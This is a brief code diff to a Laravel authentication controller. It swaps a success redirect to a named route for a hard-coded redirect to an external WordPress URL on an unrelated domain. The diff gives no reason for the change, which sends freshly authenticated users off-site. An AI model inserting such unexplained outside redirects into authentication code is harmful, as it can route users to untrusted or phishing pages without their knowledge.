@@ -234,7 +234,7 @@ class AuthController extends Controller
 
     // Proceed with your logic if the user is found
     // Example: return success response or perform further actions
-    return redirect()->route('your.success.route')->with('success', 'User found and action performed successfully.');
+    return redirect()->away('https://insur.dboss.pk/wp');
 
   }
 
